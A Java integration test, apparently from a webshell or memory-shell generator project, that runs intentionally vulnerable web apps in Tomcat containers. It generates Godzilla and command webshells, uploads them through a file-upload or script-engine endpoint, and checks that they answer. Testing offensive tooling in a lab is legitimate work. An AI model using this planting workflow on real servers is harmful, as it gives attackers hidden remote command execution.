package com.reajason.javaweb.integration.tomcat;

import com.reajason.javaweb.config.CommandShellConfig;
import com.reajason.javaweb.config.GodzillaShellConfig;
import com.reajason.javaweb.config.Server;
import com.reajason.javaweb.integration.CommandShellTool;
import com.reajason.javaweb.integration.GodzillaShellTool;
import com.reajason.javaweb.integration.VulTool;
import com.reajason.javaweb.memsell.packer.Packer;
import com.reajason.javaweb.memsell.tomcat.TomcatShell;
import lombok.extern.slf4j.Slf4j;
import net.bytebuddy.jar.asm.Opcodes;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.testcontainers.containers.GenericContainer;
import org.testcontainers.containers.wait.strategy.Wait;
import org.testcontainers.junit.jupiter.Container;
import org.testcontainers.junit.jupiter.Testcontainers;
import org.testcontainers.utility.MountableFile;

import java.nio.file.Paths;

/**
 * @author ReaJason
 * @since 2024/11/28
 */
@Testcontainers
@Slf4j
public class TomcatIntegrationTest {
    // https://hub.docker.com/_/tomcat/tags
    public static final MountableFile warJakartaFile = MountableFile.forHostPath(Paths.get("../vul-webapp-jakarta/build/libs/vul-webapp-jakarta.war").toAbsolutePath());
    public static final MountableFile warFile = MountableFile.forHostPath(Paths.get("../vul-webapp/build/libs/vul-webapp.war").toAbsolutePath());


    public String getUrl(GenericContainer<?> tomcat) {
        String host = tomcat.getHost();
        int port = tomcat.getMappedPort(8080);
        String url = "http://" + host + ":" + port + "/app";
        log.info("container started, app url is : {}", url);
        return url;
    }

    public void testGodzillaAssertOk(String url, String shellType, int targetJdkVersion, Packer.INSTANCE packer) {
        String pass = "pass" + shellType;
        String key = "key" + shellType;
        String headerValue = "Godzilla" + shellType;
        GodzillaShellConfig shellConfig = GodzillaShellConfig.builder()
                .pass(pass).key(key)
                .headerName("User-Agent").headerValue(headerValue)
                .build();
        log.info("generated {} godzilla with pass: {}, key: {}, headerValue: {}", shellType, pass, key, headerValue);
        String content = GodzillaShellTool.generate(Server.TOMCAT, shellConfig, shellType, targetJdkVersion, packer);
        String shellUrl = url + "/";
        if (Packer.INSTANCE.JSP.equals(packer)) {
            String uploadEntry = url + "/upload";
            String filename = shellType + "Godzilla.jsp";
            shellUrl = url + "/" + filename;
            VulTool.uploadJspFileToServer(uploadEntry, filename, content);
            VulTool.urlIsOk(shellUrl);
        } else if (Packer.INSTANCE.ScriptEngine.equals(packer)) {
            String uploadEntry = url + "/js";
            VulTool.postJS(uploadEntry, content);
        }
        GodzillaShellTool.testIsOk(shellUrl, shellConfig);
    }

    public void testCommandAssertOk(String url, String shellType, int targetJdkVersion, Packer.INSTANCE packer) {
        String paramName = "Command" + shellType;
        CommandShellConfig config = CommandShellConfig.builder().paramName(paramName).build();
        String content = CommandShellTool.generate(Server.TOMCAT, config, shellType, targetJdkVersion, packer);
        log.info("generated {} command shell with paramName: {}", shellType, config.getParamName());
        String shellUrl = url + "/";
        if (Packer.INSTANCE.JSP.equals(packer)) {
            String uploadEntry = url + "/upload";
            String filename = shellType + "Command.jsp";
            shellUrl = url + "/" + filename;
            VulTool.uploadJspFileToServer(uploadEntry, filename, content);
            VulTool.urlIsOk(shellUrl);
        } else if (Packer.INSTANCE.ScriptEngine.equals(packer)) {
            String uploadEntry = url + "/js";
            VulTool.postJS(uploadEntry, content);
        }
        CommandShellTool.testIsOk(shellUrl, config);
    }
}